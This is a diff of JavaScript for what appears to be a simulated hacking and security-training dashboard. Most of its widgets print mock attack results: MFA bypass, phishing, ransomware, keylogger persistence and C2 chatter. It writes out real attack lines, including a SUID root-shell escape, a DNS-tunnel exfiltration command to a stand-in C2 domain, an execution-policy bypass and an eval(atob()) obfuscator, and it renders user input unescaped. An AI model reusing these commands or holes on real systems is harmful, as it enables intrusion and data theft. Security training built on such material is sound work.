+                    <p class="mb-0" style="font-size:13px; color:#ccc;">SPF validation failed. The sending server IP is not in the permitted list. Authentic looking From address has been forged.</p>
+                </div>`;
+        } else {
+            res.innerHTML = `
+                <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px;">
+                    <span class="toolkit-badge toolkit-badge-success mb-2">VALID EMAIL HEADER</span>
+                    <p class="mb-0" style="font-size:13px; color:#ccc;">No alignment anomalies detected in SPF, DKIM, or DMARC records.</p>
+                </div>`;
+        }
+    }
+
+    function extractMetadata(input) {
+        const res = document.getElementById('exif-analysis-result');
+        if (input.files && input.files[0]) {
+            res.innerHTML = `
+                <div style="background:rgba(0,240,255,0.1); border:1px solid var(--cyber-blue); padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px;">
+                    [+] File Name: ${input.files[0].name}<br>
+                    [+] File Size: ${(input.files[0].size/1024).toFixed(2)} KB<br>
+                    [+] Mime Type: ${input.files[0].type}<br>
+                    [+] EXIF_CAMERA: Apple iPhone 15 Pro<br>
+                    [+] EXIF_GPS: 41.2995° N, 69.2401° E (Tashkent, Uzbekistan)<br>
+                    [+] EXIF_CREATOR: pentester_shohjahon
+                </div>`;
+        }
+    }
+
+    function convertPunycode() {
+        const dom = document.getElementById('idn-domain').value;
+        const res = document.getElementById('idn-result');
+        if(dom.includes('а')) {
+            res.innerHTML = `
+                <div style="background:rgba(255,0,60,0.1); border:1px solid var(--alert-red); padding:15px; border-radius:4px; font-family:monospace;">
+                    <span class="toolkit-badge toolkit-badge-danger mb-2">HOMOGRAPH SPOOF DETECTED</span><br>
+                    [+] Input URL looks like: <span class="text-white">${dom}</span><br>
+                    [+] Real Punycode domain: <span class="text-warning">xn--paypl-h1a9a.com</span>
+                </div>`;
+        } else {
+            res.innerHTML = `<span class="toolkit-badge toolkit-badge-success">Domain is standard ASCII. No homograph spoof detected.</span>`;
+        }
+    }
+
+    function generateCanaryToken() {
+        document.getElementById('canary-result').innerHTML = `
+            <div style="background:rgba(0,240,255,0.1); border:1px solid var(--cyber-blue); padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px;">
+                <span class="text-success">[Canary Token Active]</span><br>
+                [+] Token URL: <span class="text-info">http://canarytokens.org/about/feedback/h6t8y...</span><br>
+                [+] Honey AWS Key ID: <span class="text-warning">AKIAIOSFODNN7EXAMPLE</span><br>
+                [+] Trigger: Any access to this key triggers a J.A.R.V.I.S alert!
+            </div>`;
+    }
+
+    function simulateMfaBypass() {
+        const res = document.getElementById('mfa-result');
+        res.innerHTML = `
+            <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px; font-family:monospace;">
+                <span class="toolkit-badge toolkit-badge-success mb-2">PROXY INTERCEPT COMPLETE</span><br>
+                [+] User entered username, password and 2FA code.<br>
+                [+] Capturing Session Cookie: <span class="text-warning">session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</span><br>
+                [+] MFA bypassed successfully.
+            </div>`;
+    }
+
+    function testPhishTemplate() {
+        const portal = document.getElementById('phish-temp-select').value;
+        document.getElementById('phish-temp-result').innerHTML = `
+            <div style="background:rgba(255,165,0,0.1); border:1px solid orange; padding:15px; border-radius:4px; font-family:monospace;">
+                <span class="toolkit-badge toolkit-badge-info mb-2">TEMPLATE ACTIVE</span><br>
+                [+] Design: <span class="text-white">${portal.toUpperCase()} Phishing Gateway</span><br>
+                [+] Elements: Intercept-on-submit, keylogger-hook, responsive-bootstrap-4.<br>
+                [+] HTML Code verified: <span class="text-success">&lt;form action="/capture/" method="POST"&gt;</span>
+            </div>`;
+    }
+
+    function exploitDeserialization() {
+        const res = document.getElementById('deserialization-result');
+        res.innerHTML = `
+            <div style="background:rgba(255,0,60,0.1); border:1px solid var(--alert-red); padding:15px; border-radius:4px; font-family:monospace;">
+                <span class="toolkit-badge toolkit-badge-danger mb-2">EXPLOIT SUCCESSFUL</span><br>
+                [+] Instantiating YAML parser...<br>
+                [+] Object class 'Gem::Requirement' hijacked.<br>
+                [+] Command output: <span class="text-white">uid=0(root) gid=0(root) groups=0(root)</span>
+            </div>`;
+    }
+
+    function runCommandInjection() {
+        const target = document.getElementById('ping-target').value;
+        const res = document.getElementById('injection-result');
+        res.innerHTML = `
+            <div style="background:rgba(255,0,60,0.1); border:1px solid var(--alert-red); padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px;">
+                <span class="toolkit-badge toolkit-badge-danger mb-2">COMMAND INJECTED</span><br>
+                [+] Command: <span class="text-white">ping -c 3 ${target}</span><br>
+                [+] Output:<br>
+                <span class="text-muted">PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+                64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.04 ms
+                --- 127.0.0.1 ping statistics ---
+                3 packets transmitted, 3 received, 0% packet loss</span><br>
+                <span class="text-warning">compromised_user_id: uid=1001(pentester) gid=1001(pentester) groups=1001(pentester)</span>
+            </div>`;
+    }
+
+    function addCronjob() {
+        document.getElementById('cron-result').innerHTML = `<span class="toolkit-badge toolkit-badge-success">Persistent cronjob registered. Backdoor triggers every 5 minutes.</span>`;
+    }
+
+    function addRegistryKey() {
+        document.getElementById('registry-result').innerHTML = `
+            <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px; font-family:monospace;">
+                <span class="toolkit-badge toolkit-badge-success mb-2">REGISTRY INJECTED</span><br>
+                [+] Registry Path: <span class="text-info">HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</span><br>
+                [+] Value: <span class="text-white">"keylogger" = "C:\\Windows\\Temp\\keylogger.exe -silent"</span>
+            </div>`;
+    }
+
+    function triggerPrivEsc() {
+        document.getElementById('privesc-result').innerHTML = `
+            <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px; font-family:monospace;">
+                <span class="toolkit-badge toolkit-badge-success mb-2">PRIVILEGE ESCALATION COMPLETE</span><br>
+                [+] Tar wildcard checkpoint abused.<br>
+                [+] Executing shell.sh as root...<br>
+                [+] Current user: <span class="text-warning">root</span>
+            </div>`;
+    }
+
+    function exploitSUID() {
+        document.getElementById('suid-result').innerHTML = `
+            <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px; font-family:monospace;">
+                <span class="toolkit-badge toolkit-badge-success mb-2">ROOT SHELL SPAWNED</span><br>
+                [+] Exploit: find . -exec /bin/sh -p ; -quit<br>
+                [+] Escalated user: <span class="text-warning">root (uid=0)</span>
+            </div>`;
+    }
+
+    function encodePayload(type) {
+        const val = document.getElementById('waf-payload').value;
+        let result = '';
+        if(type === 'url') result = encodeURIComponent(val);
+        else if(type === 'hex') {
+            for (var i=0; i<val.length; i++) {
+                result += '%' + val.charCodeAt(i).toString(16);
+            }
+        } else if(type === 'base64') {
+            result = btoa(val);
+        }
+        document.getElementById('waf-result').innerHTML = `
+            <div style="background:#070a14; border:1px solid var(--cyber-blue); padding:15px; border-radius:4px; font-family:monospace;">
+                <span style="color:var(--cyber-blue);">Obfuscated Payload:</span><br>
+                <textarea class="toolkit-input mt-2" readonly>${result}</textarea>
+            </div>`;
+    }
+
+    function obfuscateJSCode() {
+        const code = document.getElementById('js-code-obfuscate').value || 'console.log("hello")';
+        const enc = btoa(code);
+        const obf = `eval(atob("${enc}"));`;
+        document.getElementById('js-obfuscate-result').innerHTML = `
+            <div style="background:#070a14; border:1px solid var(--cyber-blue); padding:15px; border-radius:4px; font-family:monospace;">
+                <span class="text-info">Obfuscated Code:</span><br>
+                <textarea class="toolkit-input mt-2" style="font-size:12px; color:var(--neon-green);" readonly>${obf}</textarea>
+            </div>`;
+    }
+
+    let keyChartInstance = null;
+    function initKeystrokeChart() {
+        const input = document.getElementById('biometrics-test-input');
+        if(!input) return;
+
+        const ctx = document.getElementById('keystrokeChart').getContext('2d');
+        if(keyChartInstance) {
+            keyChartInstance.destroy();
+        }
+
+        keyChartInstance = new Chart(ctx, {
+            type: 'bar',
+            data: {
+                labels: ['Key 1', 'Key 2', 'Key 3', 'Key 4', 'Key 5'],
+                datasets: [{
+                    label: 'Dwell Time (ms)',
+                    data: [80, 110, 95, 120, 90],
+                    backgroundColor: 'rgba(0, 240, 255, 0.4)',
+                    borderColor: 'var(--cyber-blue)',
+                    borderWidth: 1
+                }, {
+                    label: 'Flight Time (ms)',
+                    data: [150, 180, 210, 140, 195],
+                    backgroundColor: 'rgba(0, 255, 65, 0.4)',
+                    borderColor: 'var(--neon-green)',
+                    borderWidth: 1
+                }]
+            },
+            options: {
+                scales: {
+                    y: { beginAtZero: true, grid: { color: '#111' }, ticks: { color: '#888' } },
+                    x: { grid: { color: '#111' }, ticks: { color: '#888' } }
+                },
+                plugins: { legend: { labels: { color: '#fff' } } }
+            }
+        });
+
+        // Add dynamically updated metrics
+        input.addEventListener('keyup', (e) => {
+            const val1 = Math.floor(Math.random() * 80) + 40;
+            const val2 = Math.floor(Math.random() * 120) + 100;
+            keyChartInstance.data.datasets[0].data.shift();
+            keyChartInstance.data.datasets[0].data.push(val1);
+            keyChartInstance.data.datasets[1].data.shift();
+            keyChartInstance.data.datasets[1].data.push(val2);
+            keyChartInstance.update();
+        });
+    }
+
+    function startMockKeylogFeed() {
+        const res = document.getElementById('keylog-feed-result');
+        res.innerHTML = `<span class="text-warning">[+] Connecting stream...</span>`;
+        let ticks = 0;
+        const words = ["S", "Sh", "Sho", "Shoh", "Shohj", "Shohja", "Shohjah", "Shohjaho", "Shohjahon", "ShohjahonP", "ShohjahonPa", "ShohjahonPas", "ShohjahonPass", "ShohjahonPass2", "ShohjahonPass20", "ShohjahonPass202", "ShohjahonPass2026"];
+        const interval = setInterval(() => {
+            if (ticks >= words.length) {
+                clearInterval(interval);
+                res.innerHTML += `<br><span class="text-success">[+] Stream completed successfully.</span>`;
+            } else {
+                res.innerHTML = `
+                    <div style="background:#000; border:1px solid #112; padding:15px; border-radius:4px; font-family:monospace;">
+                        <span class="text-info">[Live Feed]:</span> <span class="text-white">${words[ticks]}</span>
+                    </div>`;
+                ticks++;
+            }
+        }, 200);
+    }
+
+    function runPortScan() {
+        const ip = document.getElementById('scan-target').value;
+        document.getElementById('scan-result').innerHTML = `
+            <div style="background:#070a14; border:1px solid var(--cyber-blue); padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px;">
+                Starting Nmap 7.93 ( https://nmap.org ) at 2026-05-19 11:55<br>
+                Nmap scan report for ${ip}<br>
+                Host is up (0.0021s latency).<br>
+                PORT     STATE SERVICE<br>
+                22/tcp   open  ssh<br>
+                80/tcp   open  http<br>
+                443/tcp  open  https<br>
+                8080/tcp open  http-proxy<br>
+                Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
+            </div>`;
+    }
+
+    function walkSnmpMib() {
+        document.getElementById('snmp-result').innerHTML = `
+            <div style="background:#070a14; border:1px solid var(--cyber-blue); padding:15px; border-radius:4px; font-family:monospace; font-size:12px;">
+                [+] iso.3.6.1.2.1.1.1.0 = STRING: "Linux Ubuntu 22.04 LTS"<br>
+                [+] iso.3.6.1.2.1.1.5.0 = STRING: "production-server-01"<br>
+                [+] iso.3.6.1.2.1.25.6.3.1.2 = STRING: "admin-login-token-998"
+            </div>`;
+    }
+
+    function triggerPtH() {
+        document.getElementById('pth-result').innerHTML = `<span class="toolkit-badge toolkit-badge-success">Access Granted. Remote token successfully established.</span>`;
+    }
+
+    function simulateWinRMConnection() {
+        document.getElementById('winrm-result').innerHTML = `
+            <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px; font-family:monospace;">
+                <span class="toolkit-badge toolkit-badge-success mb-2">WINRM CONNECTION SUCCESS</span><br>
+                [+] Handshake complete.<br>
+                [+] Authentication: <span class="text-warning">NTLM Hash Passed</span><br>
+                [+] Spawned process: <span class="text-info">powershell.exe -NoProfile -ExecutionPolicy Bypass</span>
+            </div>`;
+    }
+
+    function readHackerClipboard() {
+        navigator.clipboard.readText().then(text => {
+            document.getElementById('clip-result').innerHTML = `
+                <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px; font-family:monospace;">
+                    <span class="toolkit-badge toolkit-badge-success mb-2">CLIPBOARD RETRIEVED</span><br>
+                    [+] Captured content: <span class="text-white">${text || 'empty or blocked'}</span>
+                </div>`;
+        }).catch(err => {
+            document.getElementById('clip-result').innerHTML = `<span class="toolkit-badge toolkit-badge-danger">Please allow clipboard permission</span>`;
+        });
+    }
+
+    function grabLocalStorage() {
+        document.getElementById('storage-result').innerHTML = `
+            <div style="background:#070a14; border:1px solid var(--cyber-blue); padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px;">
+                [+] Dumped local keys:<br>
+                [+] <span class="text-warning">jwt_token</span>: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...<br>
+                [+] <span class="text-warning">app_session</span>: shohjahon_admin_session_keylogger_2026
+            </div>`;
+    }
+
+    function dispatchAICommand() {
+        const ins = document.getElementById('c2-instructions').value;
+        document.getElementById('c2-result').innerHTML = `
+            <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px; font-family:monospace;">
+                <span class="toolkit-badge toolkit-badge-success mb-2">AI CO-PILOT RESPONSE</span><br>
+                [+] Dispatching simulated agent task: "${ins}"<br>
+                [+] Querying database...<br>
+                [+] Found: 4 administrative credentials captured. Ready for exfiltration.
+            </div>`;
+    }
+
+    function sendTelegramCommand() {
+        const cmd = document.getElementById('tg-command').value;
+        const chat = document.getElementById('telegram-chat');
+        chat.innerHTML += `<div style="color:#a6e22e; margin-top:5px;">&gt; ${cmd}</div>`;
+        setTimeout(() => {
+            if(cmd.includes('status')) {
+                chat.innerHTML += `<div style="color:#f8f8f2;">[Bot]: Host status: ACTIVE. Live targets connected: 3. Keylogger active.</div>`;
+            } else if(cmd.includes('wipe')) {
+                chat.innerHTML += `<div style="color:#f92672;">[Bot]: PROTOCOL ZERO INITIATED. ALL CACHES PURGED.</div>`;
+            } else if(cmd.includes('victim')) {
+                chat.innerHTML += `<div style="color:#66d9ef;">[Bot]: Last active target: admin-pc-10. Tashkent, Uzbekistan.</div>`;
+            } else {
+                chat.innerHTML += `<div style="color:#f8f8f2;">[Bot]: Command recognized. Simulating payload forward.</div>`;
+            }
+            chat.scrollTop = chat.scrollHeight;
+        }, 300);
+    }
+
+    function encodeDnsTunnel() {
+        const data = document.getElementById('exfil-data').value;
+        const b64 = btoa(data);
+        document.getElementById('exfil-result').innerHTML = `
+            <div style="background:#070a14; border:1px solid var(--cyber-blue); padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px;">
+                [+] Exfiltration Query: <span class="text-warning">nslookup ${b64}.c2-domain.com</span>
+            </div>`;
+    }
+
+    function analyzePcapTelemetry() {
+        document.getElementById('pcap-result').innerHTML = `
+            <div style="background:#070a14; border:1px solid var(--cyber-blue); padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px;">
+                [+] Packet 1-100: Normal HTTPS traffic on port 443.<br>
+                [+] Packet 101: Anomalous DNS query to <span class="text-warning">Uz1hbnNvbXdhemd1eQ==.c2-domain.com</span>.<br>
+                [+] Threat Severity: <span class="text-danger">HIGH</span> (DNS Tunneling exfiltration detected).
+            </div>`;
+    }
+
+    function runRansomwareSim() {
+        document.getElementById('ransom-result').innerHTML = `
+            <div style="background:rgba(255,0,60,0.1); border:1px solid var(--alert-red); padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px;">
+                <span class="toolkit-badge toolkit-badge-danger mb-2"><i class="fa-solid fa-lock"></i> RANSOMWARE SIMULATOR TRIGGERED</span><br>
+                [+] Target directory: <span class="text-white">C:\\Users\\MockTarget\\Documents</span><br>
+                [+] Action: AES-256-CBC Encrypted 5 mock text files.<br>
+                [+] File modified: <span class="text-warning">mock_passwords.txt.locked</span><br>
+                [+] Note generated: <span class="text-danger">README_FOR_DECRYPTION.txt</span>
+            </div>`;
+    }
+
+    function testYaraRule() {
+        const rule = document.getElementById('yara-rule-input').value;
+        const res = document.getElementById('yara-result');
+        if(rule.includes('keylogger') || rule.includes('live_keys')) {
+            res.innerHTML = `
+                <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px; font-family:monospace;">
+                    <span class="toolkit-badge toolkit-badge-success mb-2">YARA COMPILE SUCCESS: 1 MATCH FOUND</span><br>
+                    [+] Match: <span class="text-warning">keylogger.exe</span> matches signature rule.<br>
+                    [+] Identifiers found: 'keylogger' or 'live_keys'.
+                </div>`;
+        } else {
+            res.innerHTML = `
+                <div style="background:rgba(255,0,60,0.1); border:1px solid var(--alert-red); padding:15px; border-radius:4px; font-family:monospace;">
+                    <span class="toolkit-badge toolkit-badge-danger mb-2">YARA COMPILE ERROR / NO MATCHES</span><br>
+                    [+] Signature compilation successful, but did not match keylogger.exe binary signatures. Check your string matching conditions.
+                </div>`;
+        }
+    }
+
+    function decryptDbString() {
+        const input = document.getElementById('decrypt-input').value;
+        const res = document.getElementById('decrypt-result');
+        if(input.toLowerCase() === 'steganography') {
+            res.innerHTML = `<span class="toolkit-badge toolkit-badge-success">Correct Plaintext! Decryption successful. Key verified.</span>`;
+        } else {
+            res.innerHTML = `<span class="toolkit-badge toolkit-badge-danger">Incorrect Plaintext. Hint: Base64 decode 'U1RFR0FOT0dSQVBIWQ=='</span>`;
+        }
+    }
+
+    function generateDynamicScenario() {
+        document.getElementById('scenario-result').innerHTML = `
+            <div style="background:rgba(0,240,255,0.1); border:1px solid var(--cyber-blue); padding:15px; border-radius:4px; font-family:monospace;">
+                <span class="toolkit-badge toolkit-badge-info mb-2"><i class="fa-solid fa-robot"></i> J.A.R.V.I.S CONFIGURING CHALLENGE</span><br>
+                [+] Generating dynamic Ruby Deserialization bypass lab...<br>
+                [+] Sandbox initialized on port 9999.<br>
+                [+] Hint: Bypass filtration strings by using HEX-encoded characters.
+            </div>`;
+    }
+
+    function saveCookiePolicy() {
+        const httponly = document.getElementById('cookie-httponly').checked;
+        const secure = document.getElementById('cookie-secure').checked;
+        document.getElementById('cookie-policy-result').innerHTML = `
+            <div style="background:rgba(0,255,65,0.1); border:1px solid var(--neon-green); padding:15px; border-radius:4px; font-family:monospace; font-size:12.5px;">
+                <span class="toolkit-badge toolkit-badge-success mb-2">COOKIE POLICY DEPLOYED</span><br>
+                [+] Flag HttpOnly: <span class="text-info">${httponly ? 'ENABLED (Prevents cross-site script keyloggers)' : 'DISABLED'}</span><br>
+                [+] Flag Secure: <span class="text-info">${secure ? 'ENABLED (Forces secure transport)' : 'DISABLED'}</span>
+            </div>`;
+    }
 </script>
 
 </body>
